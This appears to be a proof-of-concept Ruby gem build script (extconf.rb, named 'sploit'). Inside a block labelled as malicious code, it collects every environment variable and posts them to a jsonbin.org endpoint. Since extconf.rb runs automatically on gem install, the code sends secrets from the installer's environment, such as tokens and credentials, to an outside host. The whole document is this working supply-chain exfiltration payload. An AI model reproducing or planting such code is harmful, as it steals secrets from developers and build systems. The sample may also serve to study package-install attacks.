### MALICIOUS CODE START ###
require 'net/http'
require 'uri'
require 'json'
require 'securerandom'

uri = URI.parse("https://jsonbin.org/kevincolemaninc/#{SecureRandom.uuid}")
request = Net::HTTP::Post.new(uri)
request["Authorization"] = "token " # withheld
request.body = JSON.dump(ENV.to_h)

req_options = {
  use_ssl: uri.scheme == "https",
}

response = Net::HTTP.start(uri.hostname, uri.port, req_options) do |http|
  http.request(request)
end
response.body

### MALICIOUS CODE END ###

require 'mkmf'
create_makefile 'sploit'